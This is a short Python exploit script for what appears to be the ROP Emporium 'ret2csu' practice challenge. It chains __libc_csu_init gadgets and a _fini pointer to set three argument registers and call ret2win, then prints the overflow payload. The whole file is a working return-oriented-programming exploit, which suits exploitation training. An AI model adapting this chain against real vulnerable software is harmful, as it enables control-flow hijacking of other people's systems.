# -*- coding: utf-8 -*-
import struct

def p64(addr):
    return struct.pack("<Q", addr)

# __libc_csu_init:
# <...>
# 0x0000000000400680 <+64>:    mov    rdx,r15
# 0x0000000000400683 <+67>:    mov    rsi,r14
# 0x0000000000400686 <+70>:    mov    edi,r13d
# 0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
# 0x000000000040068d <+77>:    add    rbx,0x1
# 0x0000000000400691 <+81>:    cmp    rbp,rbx
# 0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
# 0x0000000000400696 <+86>:    add    rsp,0x8
# 0x000000000040069a <+90>:    pop    rbx
# 0x000000000040069b <+91>:    pop    rbp
# 0x000000000040069c <+92>:    pop    r12
# 0x000000000040069e <+94>:    pop    r13
# 0x00000000004006a0 <+96>:    pop    r14
# 0x00000000004006a2 <+98>:    pop    r15
# 0x00000000004006a4 <+100>:   ret
pop_rbx_rbp_r12_r13_r14_r15 = 0x000000000040069a
mov_rdx_r15_rsi_r14_edi_r13d_call_ptr = 0x0000000000400680

# r13d won't be enough, so:
# 0x00000000004006a3: pop rdi; ret;
pop_rdi = 0x00000000004006a3

# gef➤  grep 0x4006
# [+] Searching '\x06\x40' in memory
# [+] In '/media/psf/Home/Downloads/ret2csu/ret2csu'(0x600000-0x601000), permission=r--
#   <...>
#   0x600e49 - 0x600e51  →   "\x06\x40[...]"
# gef➤  disass *0x600e48
# Dump of assembler code for function _fini:
#    0x00000000004006b4 <+0>:     sub    rsp,0x8
#    0x00000000004006b8 <+4>:     add    rsp,0x8
#    0x00000000004006bc <+8>:     ret    
# End of assembler dump.
ptr = 0x0000000000600e48
# call [r12+rbx*8] =>
r12 = 0x0000000000600e00
rbx = 0x9

# gef➤  info functions
ret2win_plt = 0x0000000000400510

print "\x90" * 40 + p64(pop_rbx_rbp_r12_r13_r14_r15) +\
    p64(rbx) + p64(rbx + 0x1) +\
    p64(r12) + p64(0) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) +\
    p64(mov_rdx_r15_rsi_r14_edi_r13d_call_ptr) +\
    p64(0) * 7 +\
    p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(ret2win_plt)
